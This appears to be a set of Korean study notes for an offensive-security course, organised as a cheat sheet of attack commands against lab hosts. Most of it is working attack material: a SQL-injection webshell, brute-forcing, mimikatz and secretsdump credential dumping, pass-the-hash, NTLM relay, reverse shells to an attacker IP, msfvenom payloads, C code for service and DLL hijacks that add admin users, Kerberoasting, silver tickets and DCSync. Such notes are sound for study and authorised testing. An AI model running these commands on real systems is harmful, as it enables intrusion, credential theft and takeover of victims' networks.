# Information Gathering

## 수동적 정보 수집

### **Whois**

- WHOIS 조회 실행
    - 호스트( -h ) 플래그는 WHOIS 서비스를 실행하는 호스트를 지정

`whois megacorpone.com -h 192.168.50.251`

## 능동적 정보 수집

### Nmap

- 호스트 검색

`nmap -sn 192.168.50.1-253`

- 상위 20개 TPC 포트 스캔

`nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt`

- UDP 스캔

`sudo nmap -sU 192.168.50.149`

### FTP (21)

- Enumeration
    - Nmap -sC 옵션이 ftp-anon 검사 포함됨

`sudo nmap -sC -sV -p 21 192.168.2.142` 

- Brute-forcing

`hydra -l admin -P /path/to/passwords.txt ftp://192.168.1.100`

- 익명 로그인

`┌──(kali㉿kali)-[~/Desktop]└─$ ftp 172.31.213.250           Connected to 172.31.213.250.220 (vsFTPd 3.0.3)Name (172.31.213.250:kali): anonymous331 Please specify the password.Password: 230 Login successful.`

### DNS 열거 (53)

- 열거(DNSRecon)

`dnsrecon -d megacorpone.com -t std`

- 열거(DNSEnum)

`dnsenum megacorpone.com`

- 하위 도메인 Brute-forcing (gobuster)

`gobuster dns --domain inlanefreight.com -w /usr/share/wordlists/subdomains.txt`

- NS, ANY 요청 (ns, any)

`dig ns <domain.tld> @<nameserver>dig ns <domain.tld> @<nameserver>`

- AXFR 요청 (axfr)
    - 주 DNS 서버에서 “zone 데이터 전체 조회

`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`

### SMB (139,445)

- 열거(nbtscan)

`sudo nbtscan -r 192.168.50.0/24`

- 열거(enum4linux)

`enum4linux -a 172.31.135.192`

- Windows 환경

`net view \\dc01 /all`

- 공유 폴더 목록 조회 (Null Session)

`smbclient -N -L //172.31.135.19`

- 공유 폴더 접속

`smbclient //172.31.135.192/samba-share -U "<username>"`

- Brute-forcing

`netexec smb 10.129.42.198 -u bob -p password.txthydra -l bob -P password.txt smb://10.129.42.198`

- 디렉토리 전부 덤프

`smbclient //server/share -U usernamesmb: \> prompt offsmb: \> recurse onsmb: \> mget *`

### SMTP 열거 (25)

- 기존 사용자 확인 (VRFY, EXPN)

`nc -nv 192.168.50.8 25VRFY root`

- smtp-user-enum
    - VRFY, EXPN, RCPT 사용 가능

`smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`

### IMAP (143,993) / POP3 (110,995)

- imap/pop3 상호작용 (telnet)

`telnet 10.129.14.128 110telnet 10.129.14.128 143openssl s_client -connect 10.129.14.128:imapsopenssl s_client -connect 10.129.14.128:pop3s`

- imap 명령어 정리
    - 참고: 각 명령어 앞의 `1`은 태그(tag)로, 요청과 응답을 매칭하기 위해 사용된다.

|명령어|설명|
|---|---|
|1 LOGIN username password|사용자 로그인|
|1 LIST "" *|모든 디렉토리(메일함) 목록 조회|
|1 CREATE “INBOX”|지정한 이름으로 메일함 생성|
|1 DELETE “INBOX”|메일함 삭제|
|1 RENAME “ToRead” “Important”|메일함 이름 변경|
|1 LSUB "" *|사용자가 구독(활성화)한 메일함 목록 조회|
|1 SELECT INBOX|메일함을 선택하여 내부 메시지에 접근 가능하게 함|
|1 UNSELECT INBOX|선택한 메일함에서 나감|
|1 FETCH all|메일함 내 특정 메시지의 데이터 조회|
|1 CLOSE|Deleted 플래그가 설정된 모든 메시지 제거|
|1 LOGOUT|IMAP 서버와의 연결 종료|
|1 FETCH 1 BODY[]|전체 메시지 내용 가져오기|
|1 FETCH 1 BODY[HEADER]|메시지 헤더 가져오기|
|1 FETCH 1 BODY[TEXT]|메시지 본문 가져오기|

- pop3 명령어 정리

|명령어|설명|
|---|---|
|USER|사용자명 입력|
|PASS|비밀번호 입력|
|LIST|모든 메일 목록|
|RETR|메일 내용기|

### NFS (111, 2049)

- 공유 폴더 조회 (showmount)

`showmount -e 172.31.135.192`

- 공유 폴더 마운트

`sudo mkdir /mnt/testsudo mount -t nfs 172.31.135.192:/public-nfs /mnt/test -o nolock`

- 언마운트

`sudo umount ./target-NFS`

### SNMP 열거 (UDP 161)

- 커뮤니티 문자열 무차별 대입

`onesixtyone -c community.txt 10.129.14.128`

- snmpwalk

`snmpwalk -v2c -c public 10.129.189.221 -t 10`

- nsExtendObjects 확인

`sudo apt install snmp-mibs-downloadersnmpwalk -v2c -c public 192.168.102.149 NET-SNMP-EXTEND-MIB::nsExtendObjects`

# **Web Application Attacks**

### **Web Application Assessment Tools**

- nmap http-enum script

`sudo nmap -p80 --script=http-enum 192.168.50.20`

- Wappalyzer

`https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?pli=1`

- gobuster

`gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5`

- feroxbuster

`feroxbuster -u http://example.com -s 200`

- gobuster API 열거

`gobuster dir -u http://192.168.50.16 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt`

- curl post 데이터 전송

`curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login`

- 크롤러(파이썬)

`$ pip3 install scrapy$ wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip$ unzip ReconSpider.zip $ python3 ReconSpider.py http://inlanefreight.com`

- 크롤러

`gospider -s http://inlanefreight.com -d 2 -t 10`

## SQL Injection

### mysql

- mysql 연결

`mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert`

### mssql

- mssql 연결

`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth`

### mysql command execute

- select into outfile을 사용하여 웹 서버에 파일 생성

`' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //` 

### mssql command execute

- xp_cmdshell 활성화

`impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-authEXECUTE sp_configure 'show advanced options', 1;RECONFIGURE;EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE;`

- 쉘 명령 실행

`EXECUTE xp_cmdshell 'whoami';`

### sqlmap

- u 옵션으로 스캔할 URL 설정 / p 옵션으로 매개변수 지정

`sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user`

- command execute
    - -r 옵션으로 POST 요청이 포함된 파일 사용 / —os-shell 옵션으로 명령 실행

`sqlmap -r post.txt -p item  --os-shell --web-root "/var/www/html/tmp"`

# Fixing Exploits

## Cross-Compiling Exploit Code

### mingw-w64 크로스 컴파일러

- 설치

`sudo apt install mingw-w64`

- 리눅스에서 윈도우 실행 파일(PE)로 컴파일

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe`

# Antivirus Evasion

### Shellter

- 설치

`apt-cache search shelltersudo apt install shelltersudo apt install wine`

# Passwords Attacks

### Network Services Login Attacks

- ssh

`hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`

- rdp

`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`

- http post

`hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`

## Password Cracking

- hashcat
    - rule 위치: ls -la /usr/share/hashcat/rules/

`hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`

- 파일에서 해쉬 추출

`KalioNix@htb[/htb]$ locate *2john* /usr/bin/bitlocker2john/usr/bin/dmg2john/usr/bin/gpg2john/usr/bin/hccap2john`

`ssh2john.py SSH.private > ssh.hashjohn --wordlist=rockyou.txt ssh.hash`

## Password Manager

### KeePass

- .kdbx 파일 탐색 (KeePass 데이터베이스 파일)

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

- 데이터베이스 파일에서 해시 추출

`keepass2john Database.kdbx > keepass.hash`

- keepass 해시 크래킹

`hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force`

### **SSH Private Key Passphrase**

- ssh 개인키에서 해시 추출

`ssh2john id_rsa > ssh.hash`

- ssh 개인키 해시 크래킹 (hashcat)

`hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force`

- ssh 개인키 해시 크래킹 (john)

`sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'john --wordlist=ssh.passwords --rules=sshRules ssh.hash`

## **Working with Password Hashes**

### Windows SAM, SYSTEM, SECURITY 크랙

- sam, system, security 레지스트리 추출

`reg.exe save hklm\sam samreg.exe save hklm\system systemreg.exe save hklm\security security`

- secretsdump로 해시 덤핑

`impacket-secretsdump -sam SAM -system SYSTEM local -system system LOCAL`

### **Cracking NTLM**

- 시스템 로컬 사용자 확인

`PS C:\Users\offsec> Get-LocalUser`

- mimikatz 실행

`PS C:\tools> .\mimikatz.exeprivilege::debug`

- SeDugPrivilege 권한 활성화

`token::elevate`

- NTLM 해시 덤프

`lsadump::sam`

- 해시 크래킹

`hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Path The Hash

- SMB 엑세스

`smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`

- 쉘 실행(impacket-psexec)

`impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`

- 쉘 실행(impacket-wmiexec)

`impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`

### **Net-NTLMv2**

- responder (네트워크에서 자격증명 수집 도구)
    - NTLMv2 해시(SMB 인증 시도), Kerberos 티켓
    - 네트워크에서 사용자가 잘못된 공유 폴더 경로 입력 시 자격 증명 수집

`sudo responder -I tap0`

- 해시 크래킹

`hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`

- Net-NTLMv2 릴레이
    - `--no-http-server` : HTTP 서버를 띄우지 않고 SMB 릴레이만 사용
    - `smb2support` : SMB2/SMB3 프로토콜 활성화 (최신 Windows는 SMB2 이상을 사용하므로 필수)
    - `-t 192.168.50.212` : 타겟
    - `-c "powershell -enc ..."` : 인증 성공 시 실행할 명령어

`impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."`

### **Windows 자격 증명 보호**

- mimikatz 사용 가능한 모든 자격 증명 덤프

`PS C:\tools\mimikatz> .\mimikatz.exemimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords`

- Path The Hash

`impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`

- SSP(Security Support Provider) Injection으로 우회
    - 이미 저장된 해시를 덤프하는 대신 사용자가 로그인하는 순간의 평문 비밀번호를 가로채기

`# SSP Injectionmimikatz # privilege::debugmimikatz # misc::memssp # Log 확인type C:\Windows\System32\mimilsa.log`

# **Windows Privilege Escalation**

## **Enumerating Windows**

### **Situational Awareness**

- 사용자 이름/그룹

`whoamiwhoami /groups`

- 사용자 권한

`whoami /priv`

- 시스템의 다른 사용자와 그룹

`# CMDC:\Users\dave> net userC:\Users\dave> net localgroup# PowerShellPS C:\Users\dave> Get-LocalUserPS C:\Users\dave> Get-LocalGroup`

- 그룹 멤버 확인

`Get-LocalGroupMember adminteam`

- 운영체제 정보 확인

`systeminfo`

- 라우팅 테이블

`route print`

- 활성 네트워크 연결

`netstat -ano`

- 설치된 애플리케이션 나열

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displaynameGet-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

- 실행중인 프로세스

`Get-Process`

### **Hidden in Plain View**

- CMD - findstr

`findstr /s /i cred n:\*.*`

- PowerShell - Get-ChildItem

`Get-ChildItem -Recurse -Path N:\ -Include *cred* -File`

- PowerShell - Select-String

`Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List`

- password manager 데이터베이스 탐색

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

- 민감 정보 탐색

`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`

- 텍스트 파일 탐색

`Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`

- 특정 사용자로 cmd 실행

`runas /user:backupadmin cmd`

### Information Goldmine PowerShell

- 히스토리 파일 경로 출력

`(Get-PSReadlineOption).HistorySavePath`

- 파워쉘 히스토리

`type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

- 쉘 연결

`evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`

### **Automated Enumeration**

- winpeas

`REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1.\winPEAS.exe`

- Powerup

`Import-Module .\PowerUp.ps1Invoke-AllChecks`

### Log

- 이벤트 로그 확인

`Get-WinEvent -MaxEvents 30 | findstr backup`

- 작업 스케줄러 로그 확인

`Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" -MaxEvents 30 | findstr backup`

## Automated Escalation

### PrintSpoofer

SeImpersonatePrivilege 권한이 있고, Print Spooler 서비스(spoolsv.exe)가 실행되어 있으면 가능

- 명령 실행

`.\PrintSpoofer.exe -i -c cmd.exe.\PrintSpoofer64.exe -c "sh.exe"`

### SigmaPotato

SeImpersonatePrivilege 권한 + 여러 기법 사용

- 명령 실행

`.\SigmaPotato "net user hacked 1q2w3e4r /add".\sigmaPotato "net localgroup Administrators hacked /add"`

- 리버스쉘

`.\SigmaPotato.exe --revshell 192.168.45.155 4444`

## **Windows 서비스 활용**

### **서비스 바이너리 하이재킹**

- 바이너리 경로가 있는 서비스 목록

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

- 바이너리 권한 출력

`icacls "C:\xampp\apache\bin\httpd.exe"`

- adduser.c 코드

`#include <stdlib.h> int main (){  int i;    i = system ("net user dave2 password123! /add");  i = system ("net localgroup administrators dave2 /add");    return 0;}`

- 크로스 컴파일

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

- 서비스 시작 유형 확인

`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`

- 재부팅

`shutdown /r /t 0`

### DLL 하이재킹

- useradd C++ dll code

`#include <stdlib.h>#include <windows.h> BOOL APIENTRY DllMain(HANDLE hModule,// Handle to DLL moduleDWORD ul_reason_for_call,// Reason for calling functionLPVOID lpReserved ) // Reserved{    switch ( ul_reason_for_call )    {        case DLL_PROCESS_ATTACH: // A process is loading the DLL.        int i;  	    i = system ("net user dave3 password123! /add");  	    i = system ("net localgroup administrators dave3 /add");        break;        case DLL_THREAD_ATTACH: // A process is creating a new thread.        break;        case DLL_THREAD_DETACH: // A thread exits normally.        break;        case DLL_PROCESS_DETACH: // A process unloads the DLL.        break;    }    return TRUE;}`

- dll로 크로스 컴파일

`x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`

### **Unquoted Service Paths**

- 디렉터리 접근 권한 확인

`icacls "C:\"`

- Unquoted Service 경로 탐색 예시

`C:\Program.exeC:\Program Files\My.exeC:\Program Files\My Program\My.exeC:\Program Files\My Program\My service\service.exe`

### **다른 Windows 구성 요소 남용**

- 예약된 작업 확인

	`schtasks /query /fo LIST /v`

- 익스플로잇 사용

`# 시스템 정보systeminfo# 보안 패치 정보Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`

# **Linux Privilege Escalation**

## Linux Enumeration

### 수동 열거

- 사용자 정보

`hostnameid`

- 모든 사용자 열거

`cat /etc/passwd`

- 운영체제 릴리즈 및 버전 정보

`cat /etc/issuecat /etc/os-releaseuname -a`

- 환경 변수

`env`

- .bashrc

`cat .bashrc`

- sudo 권한

`sudo -l`

- 프로세스 정보

`ps aux`

- 라우팅 정보

`routeroutel`

- 네트워크 연결 및 수신 포트 정보

`ss -anpnetstat -nltpa`

- iptables 방화벽 정책

`cat /etc/iptables/rules.v4`

- 작업 스케줄러 정보

`ls -lah /etc/cron*crontab -l`

- dpkg 설치된 애플리케이션 정보

`dpkg -l`

- 현재 사용자가 쓰기 권한 있는 디렉터리 검색

`find / -writable -type d 2>/dev/null`

- 부팅 시 마운트되는 드라이브

`cat /etc/fstab`

- SUID 바이너리 탐색

`find / -perm -u=s -type f 2>/dev/null`

### 자동 열거

- unix-privesc-check

`unix-privesc-check standard > output.txt`

- linpeas

`./linpeas > output.txt`

- linux-exploit-suggester
    - [https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

`wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh./les.sh`

- pspy64s
    - 루트 권한 없이 시스템의 모든 프로세스를 실시간으로 모니터링
    - [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

`./pspy64s`

## **노출된 기밀 정보**

### **Inspecting Service Footprints**

- 매 초 ps 명령 실행

`watch -n 1 "ps -aux | grep pass"`

- 트래픽 필터링

`sudo tcpdump -i lo -A | grep "pass"`

- cron 로그

`grep "CRON" /var/log/syslog`

# **Port Redirection and SSH Tunneling**

## **Linux 도구를 사용한 포트 포워딩**

### ligolo-ng

- kali에서 Proxy 실행

`sudo ligolo-proxy -selfcert`

- 피봇 호스트에서 연결

`./agent -connect 192.168.45.246:11601 -ignore-cert`

- kali에서 터널링 활성화

`sessioninterface_create --name ligolostart --tun ligoloroute_add --name ligolo --route 172.16.247.0/24`

### Socat 포트 포워딩

- Socat을 사용한 포트 포워딩

`socat TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`

### **SSH 터널링**

- 로컬 포트 포워딩

`ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215`

- 동적 포트 포워딩

`# 동적 포트 포워딩ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215# proxychains4 config 파일 수정tail /etc/proxychains4.conf# proxychainsproxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`

- 리모트 포트 포워딩

`ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4`

- 리모트 동적 포트 포워딩

`# 리모트 동적 포트 포워딩ssh -N -R 9998 kali@192.168.118.4# proxychains4 config 파일 수정tail /etc/proxychains4.conf# proxychainsproxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`

### **sshuttle 사용**

- 원격 서버에서 포트 포워딩 설정

`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

- (10.4.50.0/24, 172.16.50.0/24)으로 가는 모든 트래픽을 SSH 터널을 통해 라우팅

`sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24`

## **Windows 도구를 사용한 포트 포워딩**

### Plink

- kali linux plink.exe 위치

`kali@kali:~$ find / -name plink.exe 2>/dev/null/usr/share/windows-resources/binaries/plink.exe`

- 리모트 포트 포워딩 설정

`C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4`

### Netsh

- 포트 포워딩 규칙 추가

`netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`

- 방화벽 허용 정책 추가

`netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`

- 방화벽 정책 삭제

`netsh advfirewall firewall delete rule name="port_forward_ssh_2222"`

- 포트 포워딩 규칙 삭제

`netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`

## HTTP 터널링

### **Chisel을 사용한 HTTP 터널링**

- chisel 서버 오픈

`chisel server -p 8000 --reverse`

- chisel 클라이언트

`# Reverse Port forwardingchisel client SERVER_IP:8000 R:8080:localhost:80# SOCKS proxychisel client SERVER_IP:8000 R:9990:socks`

- proxychains를 사용해서 chisel 터널링 이용

`# /etc/proxychains4.conf 설정socks5 127.0.0.1 9990# 1080 포트로 연결proxychains ssh database_admin@10.4.50.215`

# Metasploit Framework

## MSF

### 기본 명령어

- msf 데이터베이스 생성 및 초기화

`sudo msfdb init`

- metasploit 프레임워크 시작

`sudo msfconsole`

- workspace 생성

`workspace -a pen200`

- metasploit 내부에서 nmap 실행

`db_nmap -A 192.168.50.202`

- 검색된 정보 출력

`hostsservices`

- 보조 모듈 리스트

`db_nmap -A 192.168.50.202`

- smb 보조 모듈 검색

`search type:auxiliary smb`

### exploit 모듈

- 페이로드 설정

`set payload linux/x64/shell_reverse_tcp`

- 세션 나열

`sessions -l`

- 세션 접근

`sessions -i 2`

## 페이로드 사용

### 단계적/비단계적 페이로드

- 페이로드 목록 출력

`show payloads`

- 쉘 실행

`shell`

- 채널 상호작용

`channel -lchannel -i 1`

- 파일 다운로드/업로드

`download /etc/passwdupload /usr/bin/unix-privesc-check /tmp/`

### 실행 가능한 페이로드

- 사용 가능한 페이로드열

`msfvenom -l payloads --platform windows --arch x64`

- 윈도우 리버스쉘 바이너리 생성

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe`

- metasploit에서 리스너 설정

`use multi/handlerset payload windows/x64/shell/reverse_tcpshow optionsset LHOST 192.168.119.2set LPORT 443run`

## **Post-Exploitation with Metasploit**

### 핵심 기능

- shell 실행 및 권한 확인

`shellwhoami /privexit`

- getsystem을 사용하여 권한 상승
    - SeImpersonatePrivilege 및 SeDebugPrivilege 활용

`getuidgetsystemgetuid`

- migrate

`psmigrate 8052`

### 활용 후 모듈

- UAC 우회 모듈 검색

`search UAC`

- 무결성 수준 확인

`shellpowershell -ep bypassImport-Module NtObjectManagerGet-NtTokenIntegrityLevel`

- 우회 모듈 실행

`use exploit/windows/local/bypassuac_sdcltshow optionsset SESSION 9set LHOST 192.168.119.4run`

- kiwi 모듈 사용(LM,NTLM 자격증명 탈취)

`load kiwihelpcreds_msv`

### **Metasploit을 사용한 피벗팅**

- 세션 12로 라우팅

`route add 172.16.5.0/24 12`

- 포트 스캔

`use auxiliary/scanner/portscan/tcpset RHOSTS 172.16.5.200set PORTS 445,3389run`

- 자동 라우팅

`use multi/manage/autorouteshow optionssessions -lset session 12run`

- SOCKS 프로시 구성

`# metasploituse auxiliary/server/socks_proxyshow optionsset SRVHOST 127.0.0.1set VERSION 5run -j # /etc/proxychains4.conf 설정tail /etc/proxychains4.conf # proxychains 사용sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza`

- 포트 포워딩

`portfwd add -l 3389 -p 3389 -r 172.16.5.200ㅠ`

# Active Directory Enumeration

## 수동 열거

### **레거시 Windows 도구를 사용한 열거**

- 도메인 사용자 출력

`net user /domain`

- 도메인 특정 사용자 정보 출력

`net user jeffadmin /domain`

- 도메인 그룹 출력

`net group /domain`

- 특정 그룹 구성원 열거

`net group "Sales Department" /domain`

### **PowerShell 및 .NET 클래스를 사용한 열거**

- Active Directory 도메인의 상세 정보 출력

`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()`

- LDAP 경로 확인

`$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name$DN = ([adsi]'').distinguishedName $LDAP = "LDAP://$PDC/$DN"$LDAP`

`PS C:\Users\stephanie> powershell -ep bypassPS C:\Users\stephanie> .\enumeration.ps1LDAP://DC1.corp.com/DC=corp,DC=com`

### PowerView를 사용한 열거

- PowerView를 메모리로 가져오기

`Import-Module .\PowerView.ps1`

- 도메인 정보 열거

`Get-NetDomain`

- 도메인 모든 사용자 열거

`Get-NetUser`

- select 문을 사용하여 사용자 쿼리

`Get-NetUser | select cn`

- pwdlastset, lastlogon을 표시하는 쿼리

`Get-NetUser | select cn,pwdlastset,lastlogon`

- 그룹 열거

`Get-NetGroup | select cn`

- 특정 그룹 정보 열거

`Get-NetGroup "Sales Department" | select member`

- 컴퓨터 개체 열거

`Get-NetComputerGet-NetComputer | select operatingsystem,dnshostname`

### **권한 및 로그인한 사용자**

- PowerView를 사용하여 현재 로그인한 사용자가 관리자 권한을 가진 컴퓨터 열거

`Find-LocalAdminAccess`

- PowerView를 사용하여 머신에 로그인한 사용자 열거

`Get-NetSession -ComputerName files04 -Verbose`

- PsLoggedOn을 사용하여 특정 머신에 로그인한 사용자 로그온 확인

`.\PsLoggedon.exe \\files04`

- 특정 머신 rdp 로그인

`mstsc /v:client74`

### 서비스 주체 이름을 통한 열거

- 특정 사용자 계정에 연결된 SPN 목록

`setspn -L iis_service`

- PowerView를 사용한 도메인의 SPN 계정 나열

`Get-NetUser -SPN | select samaccountname,serviceprincipalname`

### 개체 권한 열거

- 사용자에 적용되어 있는 ACE를 열거

`Get-ObjectAcl -Identity stephanie`

- ObjectSID를 이름으로 변경

`Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`

- PowerView를 사용하여 SecurityIdentifier를 이름으로 변환

`Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553`

- 관리 그룹에 대한 ACL 열거

`Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`

- 관리 그룹에 GenericAll 권한이 있는 모든 SID 변환

`"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName`

### **도메인 공유 열거**

- PowerView를 사용하여 도메인 공유 쿼리

`Find-DomainShare`

## **자동 열거**

### **SharpHound를 사용하여 데이터 수집**

[https://github.com/SpecterOps/SharpHound/releases](https://github.com/SpecterOps/SharpHound/releases)

- sharphound 임포트

`Import-Module .\Sharphound.ps1`

- _SharpHound를 실행하여 도메인 데이터 수집_

`Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"`

### **BloodHound를 사용한 데이터 분석**

- Kali Linux에서 Neo4j 서비스 시작

`sudo neo4j start`

- 웹 인터페이스 접근

`http://localhost:7474# ID/PW - neo4j/neo4j -> neo4j/1q2w3e4r!`

- BloodHound 실행

`bloodhound`

- 종료

`pkill -f bloodhoundsudo neo4j stop`

# Active Directory 인증 공격

## Active Directory 인증

### 캐시된 AD 자격 증명

- mimikatz 실행 / 다른 계정이 소유한 프로세스와 상호 작용 허용

`.\mimikatz.exeprivilege::debug`

- 서버에 로그인한 모든 사용자에 대한 해시 덤프

`sekurlsa::logonpasswords`

- 메모리에 저장된 티켓 표시

`sekurlsa::tickets`

## **Active Directory 인증에 대한 공격 수행**

### **비밀번호 공격**

- 계정 정책 확인

`net accounts`

- netexec를 사용하여 password spray

`netexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success`

### **AS-REP Roasting**

Kerberos에서 “Pre-authentication” 설정이 비활성화 된 계정에 대해 비밀번호 없이 AS-REP 응답을 받아서 오프라인으로 크랙하는 공격

도메인 사용자 권한만 있으면 가능

- GetNPUsers를 사용하여 AS-REP 로스팅 수행

`impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete`

- Rubeus를 사용하여 dave 의 AS-REP 해시 얻기

`.\Rubeus.exe asreproast /nowrap`

- AS-REP 해시 크래킹

`sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### **Kerberoasting**

SPN이 등록된 서비스 계정의 티켓(TGS-REP)을 요청해서 획득한 후, 서비스 계정 비밀번호 해시를 오프라인으로 크랙하는 공격

- Rubeus를 사용하여 kerberoast 공격 수행

`.\Rubeus.exe kerberoast /outfile:hashes.kerberoast`

- Linux에서 impacket-GetUserSPNs 사용하여 Kerberoasting을 수행

`sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`

- 해시 크래킹

`sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

### Silver Tikckets

서비스 계정의 비밀번호 해시를 이용해 가짜 서비스 티켓을 직접 제작하여 특정 서비스에 원하는 권한으로 접근하는 공격

- Mimikatz를 사용하여 대상 SPN에 매핑된 사용자 계정 iis_service 의 NTLM 해시를 얻습니다.

`privilege::debugsekurlsa::logonpasswords`

- 도메인 SID 확인

`whoami /user`

- 사용자 jeffadmin으로 서비스 티켓을 위조 하고 현재 세션에 주입

`kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`

- 티켓 목록 확인

`klist`

- SMB 공유 접근

`iwr -UseDefaultCredentials http://web04`

### **Domain Controller Synchronization**

Domain Admin 권한을 가진 계정으로 도메인 컨트롤러인 척 위장하여 복제 요청을 보내면, DC가 모든 사용자의 비밀번호 해시를 전송해주는 공격

- Mimikatz를 사용하여 dcsync 공격을 수행하여 dave의 자격 증명 얻기

`.\mimikatz.exelsadump::dcsync /user:corp\dave`

- secretsdump를 사용하여 dcsync 공격을 수행하여 dave의 NTLM 해시를 얻습니다 .

